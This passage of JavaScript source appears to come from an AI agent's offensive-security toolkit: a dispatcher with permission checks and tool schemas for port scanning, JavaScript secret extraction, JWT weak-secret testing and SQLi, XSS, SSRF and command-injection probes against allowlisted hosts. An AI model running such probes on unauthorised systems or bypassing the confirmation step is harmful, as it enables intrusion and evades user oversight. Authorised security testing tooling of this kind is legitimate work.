    sev[f.confidence] = (sev[f.confidence] || 0) + 1;
    lines.push(`  [${f.confidence.toUpperCase()}] ${f.cls}: ${f.detail}`);
    lines.push(`      payload: ${f.payload}`);
    if (f.snippet) lines.push(`      evidence: ${f.snippet}`);
  }
  lines.push(`Summary: ${JSON.stringify(sev)}`);
  lines.push("Manual verification required before reporting (false positives possible).");
  return lines.join("\n");
}

// ── Dispatch + schemas ───────────────────────────────────────────────────────
const ACTIVE_TOOLS = new Set(["atk_scan_target", "atk_js_intel", "atk_auth_lab", "atk_injection_probe"]);

export async function runOffensiveTool(name, args, opts = {}) {
  if (opts.permission === "review") return "blocked by session permission: review only";
  if (ACTIVE_TOOLS.has(name) && opts.permission !== "full" && !opts.dangerouslyAutoRunCommands) {
    if (opts.noOutput) return "blocked by no-output mode";
    const summary = args.url ? `Target: ${args.url}` : args.jwt ? "JWT analysis (local)" : "";
    const ok = await opts.askYesNo?.(`Run ${name}?\n${summary}`.trim());
    if (ok === false) return "blocked by user";
  }
  switch (name) {
    case "atk_scan_target": return atkScanTarget(args);
    case "atk_js_intel": return atkJsIntel(args);
    case "atk_auth_lab": return atkAuthLab(args);
    case "atk_injection_probe": return atkInjectionProbe(args);
    default: throw new Error(`Unknown offensive tool: ${name}`);
  }
}

export function offensiveToolSchemas() {
  const schema = (name, description, properties, required = []) => ({
    type: "function",
    function: { name, description, parameters: { type: "object", properties, required, additionalProperties: false } },
  });
  return [
    schema("atk_scan_target",
      "General-purpose attack-surface scanner against an ALLOWLISTED host: bounded TCP port scan (max 40 ports) + HTTP fingerprint on open web ports (status, title, server, tech stack, script URLs).",
      {
        url: { type: "string", description: "Base URL (e.g. https://example.com). Host must be allowlisted." },
        ports: { type: "string", description: "Optional explicit ports: '80,443,8080' or range '8000-8010'. Max 40. Default: common top-35." },
        timeout_ms: { type: "number", description: "Per-port TCP timeout. Default 2000." },
      },
      ["url"]),
    schema("atk_js_intel",
      "JS/API intelligence against an ALLOWLISTED host: fetch a page or .js bundle, extract API endpoints, query params, source-map URLs, WebSockets, potential secrets/keys, and large base64 blobs. Same-origin script crawling, bounded.",
      {
        url: { type: "string", description: "Page URL or direct .js bundle URL. Host must be allowlisted." },
        max_scripts: { type: "number", description: "Max same-origin scripts to crawl from an HTML page. Default 10, max 25." },
        timeout_ms: { type: "number", description: "Fetch timeout. Default 15000." },
      },
      ["url"]),
    schema("atk_auth_lab",
      "Auth token lab: JWT decode + alg=none/alg-confusion hints + weak-secret signature test (local, bounded wordlist), and/or cookie/session flag analysis of an ALLOWLISTED URL. Detection only.",
      {
        jwt: { type: "string", description: "JWT token to analyze (local computation)." },
        url: { type: "string", description: "Optional URL to fetch for Set-Cookie / session flag analysis. Host must be allowlisted." },
        timeout_ms: { type: "number", description: "Fetch timeout for URL analysis. Default 15000." },
      }),
    schema("atk_injection_probe",
      "Generic injection oracles against an ALLOWLISTED URL: bounded, rate-limited probes for SQLi (error + differential), SSTI (math markers), reflected XSS, command injection (marker echo), SSRF (response-diff/metadata), open redirect (Location reflection). Detection only — manual verification required.",
      {
        url: { type: "string", description: "Target URL containing the parameter. Host must be allowlisted." },
        param: { type: "string", description: "Parameter name to inject into." },
        method: { type: "string", enum: ["GET", "POST"], description: "Default GET. POST sends application/x-www-form-urlencoded." },
        class: { type: "string", description: "Optional filter: sqli,ssti,xss,cmdi,ssrf,redirect (comma-separated). Default: all." },
        timeout_ms: { type: "number", description: "Per-request timeout. Default 8000." },
        delay_ms: { type: "number", description: "Polite delay between requests. Default 100, max 2000." },
      },
      ["url", "param"]),
  ];
}
